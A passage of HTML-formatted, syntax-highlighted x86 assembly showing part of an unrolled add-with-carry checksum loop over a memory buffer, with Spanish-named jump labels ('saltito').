&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000000</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000002</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000002</span><br/>
<br/>
func0_saltito1<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000007</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000008</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000000</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000008</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000008</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito2<br/>
<br/>
func0_saltito3<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000010h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000010h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000010h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito2<br/>
<br/>
func0_saltito4<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000020h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito5<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000020h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000020h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito2<br/>
<br/>
func0_saltito5<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000040h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito6<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">24h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">28h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">30h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">34h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">38h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000040h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00000040h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; func0_saltito2<br/>
<br/>
func0_saltito6<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">04h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">18h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">20h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">24h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">28h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">30h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">34h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">38h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">40h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">44h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">48h</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4Ch</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">adc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">50h</span><span style="color: black;">&#93;</span><br/>
